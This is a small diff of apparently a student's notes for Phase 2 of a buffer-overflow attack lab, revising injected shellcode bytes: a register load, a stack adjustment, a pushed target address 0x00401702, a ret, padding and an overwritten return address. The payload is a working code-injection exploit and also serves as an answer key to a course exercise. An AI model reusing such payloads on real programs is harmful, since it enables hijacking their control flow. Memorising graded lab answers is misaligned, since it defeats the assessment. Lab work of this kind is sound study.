@@ -36,12 +36,10 @@ handout.
 
 ### Phase 2:
 
-bf aa 73 fa 50 // bf = set value to rdi
 48 83 ec 08 // sub $0x8,%rsp
 48 c7 44 24 00 02 17 40 00  // movq   $0x00401702,0x0(%rsp)
-c3 00 00 // ret
-11 11 11 11
-11 11 11 11
+c3// ret
+00 00 00 00 00 // padding
 88 74 61 55 // address of first ins below
 
 
